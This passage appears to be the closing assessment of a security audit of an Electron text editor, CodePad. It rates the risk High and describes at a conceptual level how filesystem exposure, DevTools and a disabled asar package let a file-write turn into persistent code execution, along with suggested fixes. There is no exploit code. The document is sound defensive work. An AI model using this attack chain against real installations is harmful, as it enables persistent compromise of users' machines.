## 8. Closing Assessment

CodePad's **input** handling is solid — the thing everyone gets wrong (executing or rendering file content) is right, and the `contextBridge` surface is unusually disciplined in *shape*. But the app inverts the classic Electron mistake: instead of leaking Node into the renderer, it **re-exports the entire filesystem into the renderer** and then hands that renderer a DevTools console, unrestricted navigation, and a writable copy of its own source.

Net risk today: **High**. Anyone with seconds at the keyboard, or any future injection bug, converts a text editor into a persistent, silent, full-disk read/write implant. The P0 list above is roughly a day of work and removes the RCE/persistence path entirely; the P1 list closes the DoS, data-loss, and containment gaps.

The one architectural decision worth revisiting long-term: **`asar: false`**. It was chosen to make Monaco workers load over `file://` — a real constraint — but it is the reason a file-write primitive becomes code execution. A custom `protocol.handle('app', …)` origin plus `worker-src 'self'` solves the worker problem *and* lets you turn `asar` back on, which removes the single most valuable target in the whole chain.

---

*Findings are source-derived; each exploit listed is reachable from the shipped configuration (no `CODEPAD_DEV` gate, no signing, `asar:false`, DevTools enabled). Dynamic confirmation was not performed — no built artifact was supplied. Severity reflects a desktop threat model that includes local users, RDP/screen-share, UI automation, malicious "project" folders, and any future renderer injection.*
